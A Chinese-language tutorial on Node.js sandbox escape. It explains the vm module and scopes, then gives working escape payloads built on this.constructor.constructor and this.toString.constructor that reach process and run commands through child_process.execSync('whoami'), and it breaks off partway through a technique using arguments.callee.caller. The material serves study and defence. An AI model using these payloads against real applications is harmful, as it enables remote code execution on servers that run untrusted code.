## **0x01 沙箱逃逸初识**
说到沙箱逃逸，我们先来明确一些基本的概念。
  * JavaScript和Nodejs之间有什么区别：JavaScript用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此JavaScript也可以作为一门后端语言，写在后端（服务端）的JavaScript就叫叫做Nodejs。
  * 什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。
  * 沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。
  * 在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。
## **0x02 Node将字符串执行为代码**
我们先来看两个在node中将把字符串执行成代码的方式。
**方法一 eval**
首先我在目录下创建一个age.txt
    var age = 18
创建一个y1.js
    const fs = require('fs')
    let content = fs.readFileSync('age.txt', 'utf-8')
    console.log(content)
    eval(content)
    console.log(age)
可以发现我们通过eval执行了一个字符串，但是这种执行方式如果在当前作用域下已经有了同名的age变量，这个程序就会报错。
在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题，我们再看另外一种方法。
**方法二：new Function**
上面的方法因为模块间的作用域被限制了使用，那么我们考虑一下如果能够自己创建一个作用域是不是就可以更加方便的执行代码呢？new
Function的第一个参数是形参名称，第二个参数是函数体。
我们都知道函数内和函数外是两个作用域，不过当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就变的麻烦起来了。
从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个 **能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域**
，这也就是vm模块的作用。
## **0x03 Nodejs作用域**
说到作用域，我们就要说一下Node中的作用域是怎么分配的（在Node中一般把作用域叫上下文）。
在Web端（浏览器），发挥作用的一般是JavaScript，学过JavaScript的师傅应该都知道我们打开浏览器的窗口是JavaScript中最大的对象`window`，那么在服务端发挥作用的Node它的构造和JavaScript不太一样。
我们在写一个Node项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在y1.js中require了y2.js，那么我在y1.js中也无法直接调用y2.js中的变量和函数，举个例子。
在同一级目录下有`y1.js`和`y2.js`两个文件
`y1.js`
    var age = 20
`y2.js`
    const a = require("./y1")
    console.log(a.age)
运行y2.js发现报错 `age` 值为undefined
那么我们想y2中引入并使用y1中的元素应该怎么办呢，Node给我们提供了一个将js文件中元素输出的接口`exports` ，把y1修改成下面这样：
`y1.js`
    var age = 20
    exports.age = age
我们再运行y2就可以拿到age的值了
我们用图来解释这两个包之间的关系就是
这个时候就有人会问左上角的global是什么？这里就要说到Nodejs中的全局对象了。
刚才我们提到在JavaScript中`window`是全局对象，浏览器其他所有的属性都挂载在`window`下，那么在服务端的Nodejs中和`window`类似的全局对象叫做`global`，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用`global.xxx`的方式来访问，直接用`xxx`就可以调用这个变量。举个例子，`console`就是挂载在global下的一个全局变量，我们在用`console.log`输出时并不需要写成`global.console.log`，其他常见全局变量还有process（一会逃逸要用到）。
我们也可以手动声明一个全局变量，但全局变量在每个包中都是共享的，所以尽量不要声明全局变量，不然容易导致变量污染。用上面的代码举个例子：
`y1.js`
    global.age = 20
`y2.js`
    const a = require("./y1")
    console.log(age)
输出：
可以发现我这次在y1中并没有使用`exports`将age导入，并且y2在输出时也没有用`a.age`，因为此时age已经挂载在global上了，它的作用域已经不在y1中了。
我们输出一下global对象，可以看到age确实挂载在了global上：
     Object [global] {
      global: [Circular *1],
      clearInterval: [Function: clearInterval],
      clearTimeout: [Function: clearTimeout],
      setInterval: [Function: setInterval],
      setTimeout: [Function: setTimeout] {
        [Symbol(nodejs.util.promisify.custom)]: [Getter]
      },
      queueMicrotask: [Function: queueMicrotask],
      performance: Performance {
        nodeTiming: PerformanceNodeTiming {
          name: 'node',
          entryType: 'node',
          startTime: 0,
          duration: 25.98190000653267,
          nodeStart: 0.4919999986886978,
          v8Start: 2.0012000054121017,
          bootstrapComplete: 18.864999994635582,
          environment: 10.277099996805191,
          loopStart: -1,
          loopExit: -1,
          idleTime: 0
        },
        timeOrigin: 1665558311872.296
      },
      clearImmediate: [Function: clearImmediate],
      setImmediate: [Function: setImmediate] {
        [Symbol(nodejs.util.promisify.custom)]: [Getter]
      },
      age: 20
    }
## **0x04 vm沙箱逃逸**
我们在前面提到了作用域这个概念，所以我们现在思考一下，如果想要实现沙箱的隔离作用，我们是不是可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。
  * `vm.runinThisContext(code)`：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。
    const vm = require('vm');
    let localVar = 'initial value';
    const vmResult = vm.runInThisContext('localVar = "vm";');
    console.log('vmResult:', vmResult);
    console.log('localVar:', localVar);
    // vmResult: 'vm', localVar: 'initial value'
  * `vm.createContext([sandbox])`： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。
`vm.runInContext(code, contextifiedSandbox[,
options])`：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。
    const util = require('util');
      const vm = require('vm');
      global.globalVar = 3;
      const sandbox = { globalVar: 1 };
      vm.createContext(sandbox);
      vm.runInContext('globalVar *= 2;', sandbox);
      console.log(util.inspect(sandbox)); // { globalVar: 2 }
      console.log(util.inspect(globalVar)); // 3
  * `vm.runInNewContext(code[, sandbox][, options])`: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。
  * `vm.Script类` vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。
  * `new vm.Script(code, options)`：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。  
code：要被解析的JavaScript代码
        const util = require('util');
    const vm = require('vm');
    const sandbox = {
    animal: 'cat',
    count: 2
    };
    const script = new vm.Script('count += 1; name = "kitty";');
    const context = vm.createContext(sandbox);
    script.runInContext(context);
    console.log(util.inspect(sandbox));
    // { animal: 'cat', count: 3, name: 'kitty' }
script对象可以通过runInXXXContext运行。
我们一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在`creatContext`后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。
如果我们把代码改成这样（code参数最好用反引号包裹，这样可以使code更严格便于执行）：
    "use strict";
    const vm = require("vm");
    const y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);
    console.log(y1);
    vm.runInNewContext(`this.constructor.constructor('return process.env')()`);
那么我们是怎么实现逃逸的呢，首先这里面的this指向的是当前传递给`runInNewContext`的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的`()`是调用这个用Function的constructor生成的函数，最终返回了一个process对象。
下面这行代码也可以达到相同的效果：
    const y1 = vm.runInNewContext(`this.toString.constructor('return process')()`);
然后我们就可以通过返回的process对象来rce了
    y1.mainModule.require('child_process').execSync('whoami').toString()
这里知识星球上提到了一个问题，下面这段代码：
    const vm = require('vm');
    const script = `m + n`;
    const sandbox = { m: 1, n: 2 };
    const context = new vm.createContext(sandbox);
    const res = vm.runInContext(script, context);
    console.log(res)
我们能不能把`this.toString.constructor('return process')()`中的this换成{}呢？
{}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。
如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。
我们将mn改成其他类型就可以利用了：
## **0x05 vm沙箱逃逸的一些其他情况**
知识星球里提到了这样的情况：
    const vm = require('vm');
    const script = `...`;
    const sandbox = Object.create(null);
    const context = vm.createContext(sandbox);
    const res = vm.runInContext(script, context);
    console.log('Hello ' + res)
我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性`arguments.callee.caller`，它可以返回函数的调用者。
我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的`arguments.callee.caller`就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。
我们分析一下这段代码
    const vm = require('vm');
    const script = 
    `(() => {
        const a = {}
        a.toString = function () {